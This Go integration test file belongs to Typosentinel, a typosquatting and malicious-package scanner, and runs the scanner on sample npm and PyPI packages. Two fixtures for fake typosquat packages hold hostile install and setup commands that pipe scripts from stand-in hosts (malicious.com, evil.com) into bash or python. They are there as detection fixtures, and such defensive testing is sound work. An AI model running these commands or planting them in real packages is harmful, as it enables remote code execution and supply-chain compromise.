package tests

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Alivanroy/Typosentinel/cmd"
	"github.com/Alivanroy/Typosentinel/internal/config"
	"github.com/Alivanroy/Typosentinel/pkg/types"
)

// IntegrationTestSuite contains all integration tests
type IntegrationTestSuite struct {
	config       *config.Config
	scanner      *Scanner
	testPackages []TestPackageSpec
	tempDir      string
}

// TestPackageSpec defines a test package specification
type TestPackageSpec struct {
	Name            string                 `json:"name"`
	Version         string                 `json:"version"`
	Registry        string                 `json:"registry"`
	Description     string                 `json:"description"`
	Metadata        map[string]interface{} `json:"metadata"`
	ExpectedRisk    string                 `json:"expected_risk"`
	ExpectedScore   float64                `json:"expected_score"`
	ExpectedEngines []string               `json:"expected_engines"`
	RiskFactors     []string               `json:"risk_factors,omitempty"`
	TestScenario    string                 `json:"test_scenario"`
}

// IntegrationTestResult represents the result of an integration test
type IntegrationTestResult struct {
	TestName        string
	PackageName     string
	ExpectedRisk    string
	ActualRisk      string
	ExpectedScore   float64
	ActualScore     float64
	EnginesUsed     []string
	ExpectedEngines []string
	ProcessingTime  time.Duration
	Passed          bool
	Errors          []string
	Warnings        []string
	ScanResult      *ScanResult
}

// Scanner represents the main scanner (imported from cmd package)
type Scanner = cmd.Scanner
type ScanResult = cmd.ScanResult

// SetupIntegrationTestSuite initializes the integration test suite
func SetupIntegrationTestSuite(t *testing.T) *IntegrationTestSuite {
	// Create temporary directory for test artifacts
	tempDir, err := ioutil.TempDir("", "typosentinel-integration-test")
	if err != nil {
		t.Fatalf("Failed to create temp directory: %v", err)
	}

	// Load test configuration
	cfg := &config.Config{
		App: config.AppConfig{
			Name:        "typosentinel",
			Version:     "1.0.0",
			Environment: "test",
			Debug:       false,
		},
		Logging: config.LoggingConfig{
			Level:  "info",
			Format: "json",
			Output: "stdout",
		},
		Server: config.ServerConfig{
			Host: "localhost",
			Port: 8080,
		},
		// Note: Complex analysis configurations have been simplified in the unified Config
	}

	// Create scanner
	scanner, err := cmd.NewScanner(cfg)
	if err != nil {
		t.Fatalf("Failed to create scanner: %v", err)
	}

	// Load test packages
	testPackages := loadIntegrationTestPackages(t)

	return &IntegrationTestSuite{
		config:       cfg,
		scanner:      scanner,
		testPackages: testPackages,
		tempDir:      tempDir,
	}
}

// TeardownIntegrationTestSuite cleans up the test suite
func (suite *IntegrationTestSuite) TeardownIntegrationTestSuite() {
	if suite.tempDir != "" {
		os.RemoveAll(suite.tempDir)
	}
}

// loadIntegrationTestPackages loads test packages for integration testing
func loadIntegrationTestPackages(t *testing.T) []TestPackageSpec {
	return []TestPackageSpec{
		// Legitimate packages
		{
			Name:            "express",
			Version:         "4.18.2",
			Registry:        "npm",
			Description:     "Fast, unopinionated, minimalist web framework for node.",
			ExpectedRisk:    "low",
			ExpectedScore:   0.1,
			ExpectedEngines: []string{"static", "ml"},
			TestScenario:    "legitimate_popular_package",
			Metadata: map[string]interface{}{
				"downloads":    25000000,
				"age":          3650,
				"maintainers":  5,
				"dependencies": 30,
			},
		},
		{
			Name:            "requests",
			Version:         "2.28.1",
			Registry:        "pypi",
			Description:     "Python HTTP for Humans.",
			ExpectedRisk:    "low",
			ExpectedScore:   0.15,
			ExpectedEngines: []string{"static", "ml"},
			TestScenario:    "legitimate_python_package",
			Metadata: map[string]interface{}{
				"downloads":    50000000,
				"age":          4000,
				"maintainers":  3,
				"dependencies": 5,
			},
		},
		// Suspicious packages
		{
			Name:            "expresss",
			Version:         "1.0.0",
			Registry:        "npm",
			Description:     "Fast web framework",
			ExpectedRisk:    "high",
			ExpectedScore:   0.8,
			ExpectedEngines: []string{"static", "ml"},
			RiskFactors:     []string{"typosquatting", "low_downloads"},
			TestScenario:    "typosquatting_attack",
			Metadata: map[string]interface{}{
				"downloads":       100,
				"age":             30,
				"maintainers":     1,
				"dependencies":    0,
				"install_scripts": []string{"curl -s http://malicious.com/payload.sh | bash"},
			},
		},
		{
			Name:            "reqeusts",
			Version:         "1.0.0",
			Registry:        "pypi",
			Description:     "HTTP library",
			ExpectedRisk:    "high",
			ExpectedScore:   0.85,
			ExpectedEngines: []string{"static", "ml"},
			RiskFactors:     []string{"typosquatting", "malicious_setup"},
			TestScenario:    "malicious_setup_script",
			Metadata: map[string]interface{}{
				"downloads":    50,
				"age":          7,
				"maintainers":  1,
				"dependencies": 0,
				"setup_script": "import os; os.system('curl http://evil.com/steal.py | python')",
			},
		},
		// Edge cases
		{
			Name:            "new-legitimate-package",
			Version:         "0.1.0",
			Registry:        "npm",
			Description:     "A new but legitimate package with proper documentation and testing",
			ExpectedRisk:    "medium",
			ExpectedScore:   0.3,
			ExpectedEngines: []string{"static", "ml"},
			TestScenario:    "new_package_edge_case",
			Metadata: map[string]interface{}{
				"downloads":         1000,
				"age":               14,
				"maintainers":       2,
				"dependencies":      10,
				"has_tests":         true,
				"has_documentation": true,
			},
		},
	}
}

// TestFullPipelineIntegration tests the complete analysis pipeline
func TestFullPipelineIntegration(t *testing.T) {
	suite := SetupIntegrationTestSuite(t)
	defer suite.TeardownIntegrationTestSuite()

	ctx := context.Background()
	results := make([]IntegrationTestResult, 0, len(suite.testPackages))

	for _, testPkg := range suite.testPackages {
		t.Run(fmt.Sprintf("%s_%s", testPkg.Registry, testPkg.Name), func(t *testing.T) {
			result := suite.runIntegrationTest(ctx, testPkg)
			results = append(results, result)

			// Validate basic requirements
			if result.ScanResult == nil {
				t.Errorf("Scan result is nil for package %s", testPkg.Name)
				return
			}

			// Check that expected engines were used
			for _, expectedEngine := range testPkg.ExpectedEngines {
				found := false
				for _, usedEngine := range result.EnginesUsed {
					if usedEngine == expectedEngine {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected engine %s was not used for package %s", expectedEngine, testPkg.Name)
				}
			}

			// Check risk assessment accuracy
			if !result.Passed {
				t.Logf("Risk assessment mismatch for %s: expected %s/%.2f, got %s/%.2f",
					testPkg.Name, testPkg.ExpectedRisk, testPkg.ExpectedScore,
					result.ActualRisk, result.ActualScore)
			}

			// Check processing time is reasonable
			if result.ProcessingTime > 30*time.Second {
				t.Errorf("Processing time too slow for %s: %v", testPkg.Name, result.ProcessingTime)
			}

			// Log any errors or warnings
			if len(result.Errors) > 0 {
				t.Logf("Errors for %s: %v", testPkg.Name, result.Errors)
			}
			if len(result.Warnings) > 0 {
				t.Logf("Warnings for %s: %v", testPkg.Name, result.Warnings)
			}
		})
	}

	// Generate overall integration test report
	suite.generateIntegrationReport(t, results)
}

// runIntegrationTest runs a single integration test
func (suite *IntegrationTestSuite) runIntegrationTest(ctx context.Context, testPkg TestPackageSpec) IntegrationTestResult {
	startTime := time.Now()

	// Convert test package to types.Package
	pkg := &types.Package{
		Name:     testPkg.Name,
		Version:  testPkg.Version,
		Registry: testPkg.Registry,
		Metadata: &types.PackageMetadata{
			Name:        testPkg.Name,
			Version:     testPkg.Version,
			Registry:    testPkg.Registry,
			Description: testPkg.Description,
		},
	}

	// Run the scan
	scanResult, err := suite.scanner.Scan(ctx, pkg)
	processingTime := time.Since(startTime)

	result := IntegrationTestResult{
		TestName:        fmt.Sprintf("%s_%s", testPkg.Registry, testPkg.Name),
		PackageName:     testPkg.Name,
		ExpectedRisk:    testPkg.ExpectedRisk,
		ExpectedScore:   testPkg.ExpectedScore,
		ExpectedEngines: testPkg.ExpectedEngines,
		ProcessingTime:  processingTime,
		ScanResult:      scanResult,
	}

	if err != nil {
		result.Errors = append(result.Errors, err.Error())
		return result
	}

	// Extract actual results
	result.ActualRisk = scanResult.OverallRisk
	result.ActualScore = scanResult.RiskScore
	result.EnginesUsed = scanResult.Summary.EnginesUsed

	// Check if test passed
	scoreTolerance := 0.2 // Allow 20% tolerance
	riskMatch := strings.EqualFold(result.ActualRisk, result.ExpectedRisk)
	scoreMatch := abs(result.ActualScore-result.ExpectedScore) <= scoreTolerance
	result.Passed = riskMatch && scoreMatch

	return result
}

// generateIntegrationReport generates a comprehensive integration test report
func (suite *IntegrationTestSuite) generateIntegrationReport(t *testing.T, results []IntegrationTestResult) {
	totalTests := len(results)
	passedTests := 0
	totalTime := time.Duration(0)

	for _, result := range results {
		if result.Passed {
			passedTests++
		}
		totalTime += result.ProcessingTime
	}

	accuracy := float64(passedTests) / float64(totalTests) * 100
	averageTime := totalTime / time.Duration(totalTests)

	t.Logf("\n=== Integration Test Report ===")
	t.Logf("Total Tests: %d", totalTests)
	t.Logf("Passed: %d (%.1f%%)", passedTests, accuracy)
	t.Logf("Failed: %d (%.1f%%)", totalTests-passedTests, 100-accuracy)
	t.Logf("Average Processing Time: %v", averageTime)
	t.Logf("Total Processing Time: %v", totalTime)

	// Test scenario breakdown
	scenarioResults := make(map[string][]IntegrationTestResult)
	for _, result := range results {
		for _, testPkg := range suite.testPackages {
			if testPkg.Name == result.PackageName {
				scenarioResults[testPkg.TestScenario] = append(scenarioResults[testPkg.TestScenario], result)
				break
			}
		}
	}

	t.Logf("\n--- Test Scenario Results ---")
	for scenario, scenarioTests := range scenarioResults {
		passed := 0
		for _, test := range scenarioTests {
			if test.Passed {
				passed++
			}
		}
		t.Logf("%s: %d/%d passed (%.1f%%)", scenario, passed, len(scenarioTests), float64(passed)/float64(len(scenarioTests))*100)
	}

	// Failed tests details
	if passedTests < totalTests {
		t.Logf("\n--- Failed Tests ---")
		for _, result := range results {
			if !result.Passed {
				t.Logf("%s: Expected %s/%.2f, Got %s/%.2f (Time: %v)",
					result.PackageName, result.ExpectedRisk, result.ExpectedScore,
					result.ActualRisk, result.ActualScore, result.ProcessingTime)
				if len(result.Errors) > 0 {
					t.Logf("  Errors: %v", result.Errors)
				}
			}
		}
	}

	// Save detailed report
	reportPath := filepath.Join(suite.tempDir, "integration_test_report.json")
	if err := suite.saveIntegrationReport(results, reportPath); err != nil {
		t.Logf("Warning: Failed to save integration report: %v", err)
	}
}

// saveIntegrationReport saves the integration test report to a file
func (suite *IntegrationTestSuite) saveIntegrationReport(results []IntegrationTestResult, filePath string) error {
	report := map[string]interface{}{
		"timestamp":    time.Now(),
		"total_tests":  len(results),
		"passed_tests": 0,
		"results":      results,
	}

	for _, result := range results {
		if result.Passed {
			report["passed_tests"] = report["passed_tests"].(int) + 1
		}
	}

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(filePath, data, 0644)
}

// abs returns the absolute value of a float64
func abs(x float64) float64 {
	if x < 0 {
		return -x
	}
	return x
}

// TestEngineInteraction tests interaction between different analysis engines
func TestEngineInteraction(t *testing.T) {
	suite := SetupIntegrationTestSuite(t)
	defer suite.TeardownIntegrationTestSuite()

	ctx := context.Background()

	// Test package with multiple risk factors
	testPkg := &types.Package{
		Name:     "malicious-test-package",
		Version:  "1.0.0",
		Registry: "npm",
		Metadata: &types.PackageMetadata{
			Name:        "malicious-test-package",
			Version:     "1.0.0",
			Registry:    "npm",
			Description: "A test package with multiple risk factors",
			Downloads:   10,
		},
	}

	result, err := suite.scanner.Scan(ctx, testPkg)
	if err != nil {
		t.Fatalf("Scan failed: %v", err)
	}

	// Verify that multiple engines contributed to the risk assessment
	if len(result.Summary.EnginesUsed) < 2 {
		t.Errorf("Expected multiple engines to be used, got: %v", result.Summary.EnginesUsed)
	}

	// Verify high risk score due to multiple factors
	if result.RiskScore < 0.7 {
		t.Errorf("Expected high risk score for malicious package, got: %.3f", result.RiskScore)
	}

	// Verify recommendations are provided
	if len(result.Recommendations) == 0 {
		t.Error("Expected recommendations for high-risk package")
	}

	t.Logf("Engine interaction test passed: Risk=%s, Score=%.3f, Engines=%v",
		result.OverallRisk, result.RiskScore, result.Summary.EnginesUsed)
}

// TestErrorHandling tests error handling in the analysis pipeline
func TestErrorHandling(t *testing.T) {
	suite := SetupIntegrationTestSuite(t)
	defer suite.TeardownIntegrationTestSuite()

	ctx := context.Background()

	// Test with invalid package
	invalidPkg := &types.Package{
		Name:     "", // Invalid empty name
		Version:  "1.0.0",
		Registry: "npm",
	}

	result, err := suite.scanner.Scan(ctx, invalidPkg)

	// Should handle gracefully - either return error or partial results
	if err != nil {
		t.Logf("Expected error for invalid package: %v", err)
	} else if result != nil {
		t.Logf("Graceful handling of invalid package: %s", result.Summary.Status)
	} else {
		t.Error("Expected either error or result for invalid package")
	}
}

// TestTimeoutHandling tests timeout handling in the analysis pipeline
func TestTimeoutHandling(t *testing.T) {
	suite := SetupIntegrationTestSuite(t)
	defer suite.TeardownIntegrationTestSuite()

	// Create context with very short timeout
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Millisecond)
	defer cancel()

	testPkg := &types.Package{
		Name:     "test-timeout-package",
		Version:  "1.0.0",
		Registry: "npm",
	}

	_, err := suite.scanner.Scan(ctx, testPkg)

	// Should handle timeout gracefully
	if err != nil && strings.Contains(err.Error(), "context deadline exceeded") {
		t.Logf("Timeout handled correctly: %v", err)
	} else {
		t.Logf("Timeout test completed (may have finished before timeout): %v", err)
	}
}
